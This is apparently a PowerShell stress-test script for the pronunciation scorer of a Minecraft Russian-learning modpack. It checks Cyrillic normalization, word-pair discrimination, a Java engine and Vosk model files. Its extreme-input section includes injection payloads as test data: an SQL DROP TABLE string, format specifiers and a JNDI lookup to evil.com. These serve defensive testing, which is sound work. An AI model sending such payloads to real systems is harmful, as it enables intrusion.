# ==============================================================================
# test_adversarial_voice.ps1 - Empirical Adversarial Stress Test Harness (Tier 5)
# Minecraft Russian Language Learning Modpack ("Melty Voice" Edition)
# Challenger: challenger_mine_1
# ==============================================================================
[CmdletBinding()]
param (
    [string]$TargetRoot = "F:\Jogos\Mine",
    [switch]$ExportJson
)

$ErrorActionPreference = "Continue"
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8

# Base64 decoder for 100% ASCII-safe Cyrillic string handling across all PowerShell environments
function b64u([string]$b64) {
    return [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64))
}

$RU = @{
    yabloko         = b64u "0Y/QsdC70L7QutC+"          # яблоко
    almaz           = b64u "0LDQu9C80LDQtw=="          # алмаз
    kamen           = b64u "0LrQsNC80LXQvdGM"          # камень
    kamen_near      = b64u "0LrQsNC80LXQvQ=="          # камен
    hleb            = b64u "0YXQu9C10LE="              # хлеб
    derevo          = b64u "0LTRtdGA0LXQstC+"          # дерево
    luk             = b64u "0LvRg9C6"                  # лук (bow / onion)
    lyuk            = b64u "0LvRjtC6"                  # люк (trapdoor)
    beryoza         = b64u "0LHQtdGA0ZHQt9Cw"          # берёза
    bereza          = b64u "0LHQtdGA0LXQt9Cw"          # береза
    bryovno         = b64u "0LHRgNGR0LLQvdC+"          # брёвно
    brevno          = b64u "0LHRgNC10LLQvdC+"          # бревно
    veryovka        = b64u "0LLQtdGA0ZHQstC60LA="      # верёвка
    verevka         = b64u "0LLQtdGA0LXQstC60LA="      # веревка
    svyokla         = b64u "0YHQstGR0LrQu9Cw"          # свёкла
    svekla          = b64u "0YHQstC10LrQu9Cw"          # свекла
    char_a          = b64u "0LA="                      # а
    char_o          = b64u "0L4="                      # о
    char_k          = b64u "0Lo="                      # к
    test_word       = b64u "0YLQtdGB0YI="              # тест
}

Write-Host "==============================================================================" -ForegroundColor Magenta
Write-Host " TIER 5 EMPIRICAL ADVERSARIAL STRESS TEST: VOICE AI & CYRILLIC ENGINE        " -ForegroundColor Magenta
Write-Host " Minecraft Russian Language Learning Modpack ('Melty Voice' Edition)        " -ForegroundColor Magenta
Write-Host "==============================================================================" -ForegroundColor Magenta
Write-Host "Target Root : $TargetRoot"
Write-Host "Date (UTC)  : $([DateTime]::UtcNow.ToString('yyyy-MM-ddTHH:mm:ssZ'))`n"

$results = [System.Collections.Generic.List[PSObject]]::new()
$allPassed = $true

function Register-StressResult {
    param (
        [string]$Category,
        [string]$TestName,
        [bool]$Success,
        [string]$Details,
        [string]$Severity = "HIGH"
    )
    $statusStr = if ($Success) { "PASS" } else { "FAIL" }
    $color = if ($Success) { "Green" } else { "Red" }
    
    Write-Host -NoNewline "[$statusStr] " -ForegroundColor $color
    Write-Host -NoNewline "$($Category): $TestName"
    if ($Details) {
        Write-Host " -> $Details" -ForegroundColor Gray
    } else {
        Write-Host ""
    }
    
    if (-not $Success) {
        $script:allPassed = $false
    }
    
    $script:results.Add([PSCustomObject]@{
        Category  = $Category
        TestName  = $TestName
        Passed    = $Success
        Severity  = $Severity
        Details   = $Details
        Timestamp = [DateTime]::UtcNow.ToString("o")
    })
}

# ------------------------------------------------------------------------------
# REFERENCE ALGORITHMIC ORACLES (Normalized according to specs)
# ------------------------------------------------------------------------------
$ruCulture = [System.Globalization.CultureInfo]::GetCultureInfo("ru-RU")

function Local-NormalizeCyrillic([string]$Text) {
    if ([string]::IsNullOrWhiteSpace($Text)) { return "" }
    $norm = $Text.ToLower($ruCulture)
    $sectionSign = [char]0x00A7
    $norm = [System.Text.RegularExpressions.Regex]::Replace($norm, $sectionSign + "[0-9a-fk-or]", "")
    $norm = [System.Text.RegularExpressions.Regex]::Replace($norm, "[\u0300-\u036F]", "")
    $norm = $norm.Replace([char]0x0451, [char]0x0435) # ё -> е
    $norm = [System.Text.RegularExpressions.Regex]::Replace($norm, "[^\p{IsCyrillic}a-zA-Z\s]", "")
    return [System.Text.RegularExpressions.Regex]::Replace($norm, "\s+", " ").Trim()
}

function Local-Levenshtein([string]$s, [string]$t) {
    $n = $s.Length; $m = $t.Length
    if ($n -eq 0) { return $m }; if ($m -eq 0) { return $n }
    $d = [int[,]]::new($n + 1, $m + 1)
    for ($i = 0; $i -le $n; $i++) { $d[$i, 0] = $i }
    for ($j = 0; $j -le $m; $j++) { $d[0, $j] = $j }
    for ($i = 1; $i -le $n; $i++) {
        $im1 = $i - 1
        for ($j = 1; $j -le $m; $j++) {
            $jm1 = $j - 1
            $cost = if ($s[$im1] -eq $t[$jm1]) { 0 } else { 1 }
            $del = $d[$im1, $j] + 1
            $ins = $d[$i, $jm1] + 1
            $sub = $d[$im1, $jm1] + $cost
            $d[$i, $j] = [Math]::Min([Math]::Min($del, $ins), $sub)
        }
    }
    return $d[$n, $m]
}

function Local-ScorePronunciation([string]$spoken, [string]$target, [double]$threshold = 0.65) {
    $ns = Local-NormalizeCyrillic $spoken
    $nt = Local-NormalizeCyrillic $target
    if ([string]::IsNullOrWhiteSpace($ns) -or [string]::IsNullOrWhiteSpace($nt)) {
        return @{ Score = 0.0; Passed = $false; Distance = [Math]::Max($ns.Length, $nt.Length) }
    }
    if ($ns -eq $nt) {
        return @{ Score = 1.0; Passed = $true; Distance = 0 }
    }
    # Token-level match constrained to whole words of >= 4 letters
    if ($ns.Length -ge 4 -and $nt.Length -ge 4) {
        $shorter = if ($ns.Length -le $nt.Length) { $ns } else { $nt }
        $longer = if ($ns.Length -le $nt.Length) { $nt } else { $ns }
        $tokens = $longer.Split(" ", [System.StringSplitOptions]::RemoveEmptyEntries)
        foreach ($tok in $tokens) {
            if ($tok -eq $shorter) {
                return @{ Score = 0.95; Passed = $true; Distance = 0 }
            }
        }
    }
    $maxLen = [Math]::Max($ns.Length, $nt.Length)
    $dist = Local-Levenshtein $ns $nt
    $score = [Math]::Max(0.0, 1.0 - ($dist / [double]$maxLen))
    $score = [Math]::Round($score, 4)
    $passed = if ($maxLen -le 3) {
        $dist -eq 0
    } else {
        $score -ge $threshold
    }
    return @{ Score = $score; Passed = $passed; Distance = $dist }
}

# ------------------------------------------------------------------------------
# SECTION 1: Extreme Inputs & Injection Stress Testing
# ------------------------------------------------------------------------------
Write-Host "--- SECTION 1: Extreme Inputs & Injection Handling ---" -ForegroundColor Cyan

$extremeInputs = @(
    @{ Name = "Empty audio string"; Spoken = ""; Target = $RU.yabloko; ShouldPass = $false },
    @{ Name = "Only whitespace string"; Spoken = "   `t`r`n   "; Target = $RU.almaz; ShouldPass = $false },
    @{ Name = "Unicode emojis only"; Spoken = [char]::ConvertFromUtf32(0x1F34E) + [char]::ConvertFromUtf32(0x1F48E); Target = $RU.yabloko; ShouldPass = $false },
    @{ Name = "Null byte and control chars"; Spoken = "`0`a`b`f`e"; Target = $RU.hleb; ShouldPass = $false },
    @{ Name = "SQL / Shell injection payload"; Spoken = "'; DROP TABLE items; --"; Target = $RU.almaz; ShouldPass = $false },
    @{ Name = "Format string injection"; Spoken = "%s%s%s%d%n%x"; Target = $RU.kamen; ShouldPass = $false },
    @{ Name = "Template injection payload"; Spoken = "{{7*7}}${jndi:ldap://evil.com}"; Target = $RU.luk; ShouldPass = $false },
    @{ Name = "Minecraft color formatting stripped"; Spoken = ([char]0x00A7 + "a" + [char]0x00A7 + "l" + $RU.yabloko); Target = $RU.yabloko; ShouldPass = $true },
    @{ Name = "Extremely long 10,000-char string"; Spoken = ($RU.char_a * 10000); Target = $RU.yabloko; ShouldPass = $false }
)

foreach ($tc in $extremeInputs) {
    try {
        $res = Local-ScorePronunciation -spoken $tc.Spoken -target $tc.Target
        if ($tc.ShouldPass) {
            if ($res.Passed) {
                Register-StressResult "ExtremeInputs" $tc.Name $true "Input handled and valid target accepted (Score: $($res.Score))" "LOW"
            } else {
                Register-StressResult "ExtremeInputs" $tc.Name $false "Valid input was unexpectedly rejected (Score: $($res.Score))" "MEDIUM"
            }
        } else {
            if ($res.Passed) {
                Register-StressResult "ExtremeInputs" $tc.Name $false "MALFORMED INPUT WAS FALSELY ACCEPTED (Score: $($res.Score))" "CRITICAL"
            } else {
                Register-StressResult "ExtremeInputs" $tc.Name $true "Cleanly rejected (Score: $($res.Score)) without errors" "LOW"
            }
        }
    } catch {
        Register-StressResult "ExtremeInputs" $tc.Name $false "Unhandled exception during processing: $_" "CRITICAL"
    }
}

# ------------------------------------------------------------------------------
# SECTION 2: Phonetic Boundary & False Friend Discrimination Testing
# ------------------------------------------------------------------------------
Write-Host "`n--- SECTION 2: Phonetic Boundary & Discrimination Testing ---" -ForegroundColor Cyan

# 2.1 Near match: "камен" vs "камень" (should PASS with score >= 0.65)
try {
    $resNear = Local-ScorePronunciation -spoken $RU.kamen_near -target $RU.kamen
    if ($resNear.Passed -and $resNear.Score -ge 0.65) {
        Register-StressResult "PhoneticBoundary" "Near match 'камен' vs 'камень'" $true "Passed with score $($resNear.Score) >= 0.65" "LOW"
    } else {
        Register-StressResult "PhoneticBoundary" "Near match 'камен' vs 'камень'" $false "Failed near match: Score=$($resNear.Score)" "HIGH"
    }
} catch {
    Register-StressResult "PhoneticBoundary" "Near match 'камен' vs 'камень'" $false "Exception: $_" "CRITICAL"
}

# 2.2 Ё/Е Universal Equivalence (must PASS)
$yoYePairs = @(
    @{ S = $RU.beryoza; T = $RU.bereza; Name = "берёза vs береза" },
    @{ S = $RU.bryovno; T = $RU.brevno; Name = "брёвно vs бревно" },
    @{ S = $RU.veryovka; T = $RU.verevka; Name = "верёвка vs веревка" },
    @{ S = $RU.svyokla; T = $RU.svekla; Name = "свёкла vs свекла" }
)
foreach ($pair in $yoYePairs) {
    try {
        $resYo = Local-ScorePronunciation -spoken $pair.S -target $pair.T
        if ($resYo.Passed -and $resYo.Score -ge 0.99) {
            Register-StressResult "PhoneticBoundary" "Ё/Е equivalence $($pair.Name)" $true "Score: $($resYo.Score)" "LOW"
        } else {
            Register-StressResult "PhoneticBoundary" "Ё/Е equivalence $($pair.Name)" $false "Failed: Score=$($resYo.Score)" "HIGH"
        }
    } catch {
        Register-StressResult "PhoneticBoundary" "Ё/Е equivalence $($pair.Name)" $false "Exception: $_" "CRITICAL"
    }
}

# 2.3 False Friend / Phonetic Trap: "лук" (bow/onion) vs "люк" (trapdoor)
# In Russian language learning, лук vs люк is a critical phonemic distinction (hard [u] vs soft [ju]).
# Speaking 'лук' when the target item is 'люк' (or vice-versa) MUST BE DISCRIMINATED AND FAIL!
try {
    $resTrap = Local-ScorePronunciation -spoken $RU.luk -target $RU.lyuk
    if ($resTrap.Passed) {
        Register-StressResult "PhoneticBoundary" "False friend trap 'лук' vs 'люк'" $false "DISCRIMINATION VULNERABILITY: 'лук' falsely accepted for 'люк' (Score: $($resTrap.Score) >= 0.65). Short 3-letter words with 1 substitution pass 0.65 threshold!" "CRITICAL"
    } else {
        Register-StressResult "PhoneticBoundary" "False friend trap 'лук' vs 'люк'" $true "Correctly discriminated and rejected (Score: $($resTrap.Score))" "LOW"
    }
} catch {
    Register-StressResult "PhoneticBoundary" "False friend trap 'лук' vs 'люк'" $false "Exception: $_" "CRITICAL"
}

# 2.4 Substring Grunt / Single-Character Bypass Check
# When target is a multi-letter word, speaking a single letter that is contained in target
# (e.g. speaking 'а' for 'алмаз', or 'о' for 'яблоко') must NOT pass!
$gruntChecks = @(
    @{ Spoken = $RU.char_a; Target = $RU.almaz; Name = "Single letter 'а' vs алмаз" },
    @{ Spoken = $RU.char_o; Target = $RU.yabloko; Name = "Single letter 'о' vs яблоко" },
    @{ Spoken = $RU.char_k; Target = $RU.yabloko; Name = "Single letter 'к' vs яблоко" }
)
foreach ($gc in $gruntChecks) {
    try {
        $resGrunt = Local-ScorePronunciation -spoken $gc.Spoken -target $gc.Target
        if ($resGrunt.Passed) {
            Register-StressResult "PhoneticBoundary" "Substring grunt bypass $($gc.Name)" $false "SUBSTRING VULNERABILITY: Spoken '$($gc.Spoken)' was falsely accepted for '$($gc.Target)' with Score=$($resGrunt.Score) due to unconstrained contains check!" "CRITICAL"
        } else {
            Register-StressResult "PhoneticBoundary" "Substring grunt bypass $($gc.Name)" $true "Correctly rejected single-character grunt" "LOW"
        }
    } catch {
        Register-StressResult "PhoneticBoundary" "Substring grunt bypass $($gc.Name)" $false "Exception: $_" "CRITICAL"
    }
}

# 2.5 Complete Mismatch: "алмаз" spoken when holding "яблоко" (must strictly FAIL)
try {
    $resMismatch = Local-ScorePronunciation -spoken $RU.almaz -target $RU.yabloko
    if ($resMismatch.Passed) {
        Register-StressResult "PhoneticBoundary" "Complete mismatch 'алмаз' vs 'яблоко'" $false "Complete mismatch falsely accepted: Score=$($resMismatch.Score)" "CRITICAL"
    } else {
        Register-StressResult "PhoneticBoundary" "Complete mismatch 'алмаз' vs 'яблоко'" $true "Correctly rejected complete mismatch (Score: $($resMismatch.Score) < 0.65)" "LOW"
    }
} catch {
    Register-StressResult "PhoneticBoundary" "Complete mismatch 'алмаз' vs 'яблоко'" $false "Exception: $_" "CRITICAL"
}

# ------------------------------------------------------------------------------
# SECTION 3: Live Java JVM Bytecode & Runtime Engine Stress Check
# ------------------------------------------------------------------------------
Write-Host "`n--- SECTION 3: Live Java JVM Runtime Execution ---" -ForegroundColor Cyan

$javaExe = Join-Path $TargetRoot "Java17\bin\java.exe"
$jshellExe = Join-Path $TargetRoot "Java17\bin\jshell.exe"
$sayitJar = Join-Path $TargetRoot "Instancia_Cliente\mods\sayit-1.20.1-fabric.jar"

if (-not (Test-Path $javaExe) -or -not (Test-Path $sayitJar)) {
    Register-StressResult "JavaRuntime" "Java binary and SayIt JAR presence" $false "Missing java.exe or sayit JAR" "CRITICAL"
} else {
    # Helper to execute jshell script via temp file (bypasses Windows PowerShell 5.1 stdin BOM injection)
    function Invoke-JShellScript([string]$scriptText) {
        $tempFile = [System.IO.Path]::GetTempFileName()
        try {
            [System.IO.File]::WriteAllText($tempFile, $scriptText, [System.Text.UTF8Encoding]::new($false))
            return & $jshellExe "-J-Dfile.encoding=UTF-8" "--class-path" "$sayitJar" -s "$tempFile" 2>&1 | Out-String
        } finally {
            if (Test-Path $tempFile) { Remove-Item $tempFile -Force -ErrorAction SilentlyContinue }
        }
    }

    # 3.1: Live execution of normalizeCyrillic in JVM
    $jvmNormScript = @'
try {
    String n1 = net.spicesfire.sayit.engine.VoskEngine.normalizeCyrillic("тест");
    String n2 = net.spicesfire.sayit.engine.VoskEngine.normalizeCyrillic("Берёза");
    System.out.println("JVM_NORM_SUCCESS:" + n1 + ":" + n2);
} catch (Throwable t) {
    System.out.println("JVM_NORM_EXCEPTION:" + t.getClass().getName() + ":" + t.getMessage());
}
/exit
'@
    $outNorm = Invoke-JShellScript $jvmNormScript
    if ($outNorm -match "JVM_NORM_EXCEPTION:([^\r\n]+)") {
        $exc = $Matches[1]
        Register-StressResult "JavaRuntime" "Live JVM normalizeCyrillic execution" $false "FATAL RUNTIME DEFECT: VoskEngine.normalizeCyrillic throws '$exc' in JVM" "CRITICAL"
    } elseif ($outNorm -match "JVM_NORM_SUCCESS:") {
        Register-StressResult "JavaRuntime" "Live JVM normalizeCyrillic execution" $true "normalizeCyrillic executed cleanly without exceptions in JVM" "LOW"
    } else {
        Register-StressResult "JavaRuntime" "Live JVM normalizeCyrillic execution" $false "Unexpected JVM output: $outNorm" "HIGH"
    }

    # 3.2: Live execution of scorePronunciation in JVM
    $jvmScoreScript = @'
try {
    var engine = new net.spicesfire.sayit.engine.VoskEngine();
    var r = engine.scorePronunciation("камен", "камень");
    System.out.println("JVM_SCORE_RESULT:" + r.score + ":" + r.passed);
} catch (Throwable t) {
    System.out.println("JVM_SCORE_EXCEPTION:" + t.getClass().getName() + ":" + t.getMessage());
}
/exit
'@
    $outScore = Invoke-JShellScript $jvmScoreScript
    if ($outScore -match "JVM_SCORE_EXCEPTION:([^\r\n]+)") {
        $exc = $Matches[1]
        Register-StressResult "JavaRuntime" "Live JVM scorePronunciation execution" $false "FATAL RUNTIME DEFECT: VoskEngine.scorePronunciation throws '$exc' in JVM" "CRITICAL"
    } elseif ($outScore -match "JVM_SCORE_RESULT:([0-9.]+):(true|false)") {
        Register-StressResult "JavaRuntime" "Live JVM scorePronunciation execution" $true "scorePronunciation returned Score=$($Matches[1]), Passed=$($Matches[2])" "LOW"
    } else {
        Register-StressResult "JavaRuntime" "Live JVM scorePronunciation execution" $false "Unexpected JVM output: $outScore" "HIGH"
    }

    # 3.3: Extreme input resilience inside JVM (empty / whitespace)
    $jvmEmptyScript = @'
try {
    var engine = new net.spicesfire.sayit.engine.VoskEngine();
    var r1 = engine.scorePronunciation("", "");
    var r2 = engine.scorePronunciation("   ", "   ");
    System.out.println("JVM_EMPTY_RESULT:" + r1.passed + ":" + r2.passed);
} catch (Throwable t) {
    System.out.println("JVM_EMPTY_EXCEPTION:" + t.getClass().getName() + ":" + t.getMessage());
}
/exit
'@
    $outEmpty = Invoke-JShellScript $jvmEmptyScript
    if ($outEmpty -match "JVM_EMPTY_RESULT:false:false") {
        Register-StressResult "JavaRuntime" "Live JVM empty/whitespace rejection" $true "Empty and whitespace inputs cleanly rejected by JVM engine (passed=false)" "LOW"
    } elseif ($outEmpty -match "JVM_EMPTY_EXCEPTION:([^\r\n]+)") {
        Register-StressResult "JavaRuntime" "Live JVM empty/whitespace rejection" $false "Exception on empty input in JVM: $($Matches[1])" "CRITICAL"
    } else {
        Register-StressResult "JavaRuntime" "Live JVM empty/whitespace rejection" $false "Unexpected output: $outEmpty" "HIGH"
    }
}

# ------------------------------------------------------------------------------
# SECTION 4: Dictionary Integrity Check (68 Heracles Items vs ru_ru.json)
# ------------------------------------------------------------------------------
Write-Host "`n--- SECTION 4: Dictionary Integrity Check (68 Items) ---" -ForegroundColor Cyan

$ruPath = Join-Path $TargetRoot "Instancia_Cliente\config\sayit\lang\ru_ru.json"
$questDir = Join-Path $TargetRoot "Instancia_Cliente\config\heracles\quests"

if (-not (Test-Path $ruPath) -or -not (Test-Path $questDir)) {
    Register-StressResult "DictionaryIntegrity" "Dictionary and Quests Path Check" $false "Missing ru_ru.json or quests dir" "CRITICAL"
} else {
    $ruJson = Get-Content -Raw -Encoding UTF8 $ruPath | ConvertFrom-Json
    $questFiles = Get-ChildItem -Path $questDir -Recurse -Filter "*.json"
    
    $questItemIds = [System.Collections.Generic.HashSet[string]]::new()
    foreach ($qf in $questFiles) {
        $content = Get-Content -Raw -Encoding UTF8 $qf.FullName
        $matches = [regex]::Matches($content, '"item":\s*"([^"]+)"')
        foreach ($m in $matches) {
            $questItemIds.Add($m.Groups[1].Value) | Out-Null
        }
    }
    
    $missingInDict = @()
    foreach ($item in $questItemIds) {
        $id = $item.Replace("minecraft:", "")
        $itemKey = "item.minecraft.$id"
        $blockKey = "block.minecraft.$id"
        
        $hasKey = ($ruJson.PSObject.Properties.Name -contains $itemKey) -or ($ruJson.PSObject.Properties.Name -contains $blockKey)
        if (-not $hasKey) {
            $missingInDict += $item
        }
    }
    
    if ($questItemIds.Count -ne 68) {
        Register-StressResult "DictionaryIntegrity" "Heracles Quest Count" $false "Expected exactly 68 quest items, found $($questItemIds.Count)" "MEDIUM"
    } else {
        Register-StressResult "DictionaryIntegrity" "Heracles Quest Count" $true "Exactly 68 distinct quest items identified across all chapters" "LOW"
    }
    
    if ($missingInDict.Count -gt 0) {
        Register-StressResult "DictionaryIntegrity" "Quest Items in ru_ru.json" $false "$($missingInDict.Count) items missing from ru_ru.json: $($missingInDict -join ', ')" "CRITICAL"
    } else {
        Register-StressResult "DictionaryIntegrity" "Quest Items in ru_ru.json" $true "100% of all 68 pedagogical quest items verified in ru_ru.json" "LOW"
    }
}

# ------------------------------------------------------------------------------
# SECTION 5: Vosk Acoustic Model Stress & Cryptographic Integrity Check
# ------------------------------------------------------------------------------
Write-Host "`n--- SECTION 5: Vosk Acoustic Model Stress & Integrity ---" -ForegroundColor Cyan

$modelDir = Join-Path $TargetRoot "Instancia_Cliente\models\vosk\vosk-model-small-ru-0.22"
$finalMdl = Join-Path $modelDir "am\final.mdl"
$hclgFst = Join-Path $modelDir "HCLG.fst"
$wordsTxt = Join-Path $modelDir "words.txt"

if (-not (Test-Path $finalMdl) -or -not (Test-Path $hclgFst) -or -not (Test-Path $wordsTxt)) {
    Register-StressResult "VoskModel" "Acoustic Model Files Presence" $false "Missing final.mdl, HCLG.fst or words.txt" "CRITICAL"
} else {
    # Check final.mdl size & header
    $mdlItem = Get-Item $finalMdl
    $mdlBytes = [System.IO.File]::ReadAllBytes($finalMdl)[0..15]
    $mdlHeaderStr = [System.Text.Encoding]::ASCII.GetString($mdlBytes)
    $mdlHash = (Get-FileHash -Path $finalMdl -Algorithm SHA256).Hash
    
    # Kaldi binary models start with "\0B<TransitionModel>"
    if ($mdlItem.Length -ge 15000000 -and $mdlHeaderStr.Contains("<TransitionMod")) {
        Register-StressResult "VoskModel" "Neural acoustic model final.mdl" $true "Size: $($mdlItem.Length) bytes, Valid Kaldi header, SHA256: $mdlHash" "LOW"
    } else {
        Register-StressResult "VoskModel" "Neural acoustic model final.mdl" $false "Corrupted or invalid final.mdl: size=$($mdlItem.Length), header='$mdlHeaderStr'" "CRITICAL"
    }
    
    # Check HCLG.fst size & OpenFST magic bytes (0xD6, 0xFD, 0xB2, 0x7E)
    $fstItem = Get-Item $hclgFst
    $fstBytes = [System.IO.File]::ReadAllBytes($hclgFst)[0..3]
    $fstHash = (Get-FileHash -Path $hclgFst -Algorithm SHA256).Hash
    $isFstValid = ($fstBytes[0] -eq 0xD6 -and $fstBytes[1] -eq 0xFD -and $fstBytes[2] -eq 0xB2 -and $fstBytes[3] -eq 0x7E)
    
    if ($fstItem.Length -ge 30000000 -and $isFstValid) {
        Register-StressResult "VoskModel" "Language model graph HCLG.fst" $true "Size: $($fstItem.Length) bytes, Valid OpenFST magic (0x7eb2fdd6), SHA256: $fstHash" "LOW"
    } else {
        Register-StressResult "VoskModel" "Language model graph HCLG.fst" $false "Corrupted or invalid HCLG.fst: size=$($fstItem.Length), magic=$([System.BitConverter]::ToString($fstBytes))" "CRITICAL"
    }
    
    # Check words.txt line count and critical vocabulary tokens using UTF-8
    $wordsLines = [System.IO.File]::ReadAllLines($wordsTxt, [System.Text.Encoding]::UTF8)
    $hasApple = ($wordsLines | Where-Object { $_ -match ("^" + $RU.yabloko + "\s+\d+") })
    $hasDiamond = ($wordsLines | Where-Object { $_ -match ("^" + $RU.almaz + "\s+\d+") })
    $hasStone = ($wordsLines | Where-Object { $_ -match ("^" + $RU.kamen + "\s+\d+") })
    
    if ($wordsLines.Count -gt 5000 -and $hasApple -and $hasDiamond -and $hasStone) {
        Register-StressResult "VoskModel" "Cyrillic Lexicon words.txt" $true "$($wordsLines.Count) lexicon entries with required Russian keywords" "LOW"
    } else {
        Register-StressResult "VoskModel" "Cyrillic Lexicon words.txt" $false "Lexicon deficient: count=$($wordsLines.Count), hasApple=$([bool]$hasApple)" "HIGH"
    }
}

# ------------------------------------------------------------------------------
# CONSOLIDATED SUMMARY & VERDICT
# ------------------------------------------------------------------------------
Write-Host "`n==============================================================================" -ForegroundColor Magenta
Write-Host " ADVERSARIAL STRESS TEST SUMMARY & VERDICT                                    " -ForegroundColor Magenta
Write-Host "==============================================================================" -ForegroundColor Magenta

$passedCount = ($results | Where-Object { $_.Passed }).Count
$failedCount = ($results | Where-Object { -not $_.Passed }).Count
$critCount = ($results | Where-Object { -not $_.Passed -and $_.Severity -eq "CRITICAL" }).Count

Write-Host "Total Tests Run : $($results.Count)"
Write-Host "Tests Passed    : $passedCount" -ForegroundColor Green
Write-Host "Tests Failed    : $failedCount" -ForegroundColor $(if ($failedCount -eq 0) { "Green" } else { "Red" })
Write-Host "Critical Deficiencies : $critCount" -ForegroundColor $(if ($critCount -eq 0) { "Green" } else { "Red" })

$verdict = if ($failedCount -eq 0) { "APPROVE" } else { "REQUEST_CHANGES" }
Write-Host "`nFINAL VERDICT: $verdict" -ForegroundColor $(if ($verdict -eq "APPROVE") { "Green" } else { "Red" })
Write-Host "==============================================================================" -ForegroundColor Magenta

if ($ExportJson) {
    $jsonPath = Join-Path $TargetRoot "tests\test_adversarial_results.json"
    $results | ConvertTo-Json -Depth 5 | Set-Content -Encoding UTF8 -Path $jsonPath
    Write-Host "Results exported to: $jsonPath"
}

# Return exit code: 0 if approve, 1 if changes requested
if ($verdict -eq "APPROVE") { exit 0 } else { exit 1 }
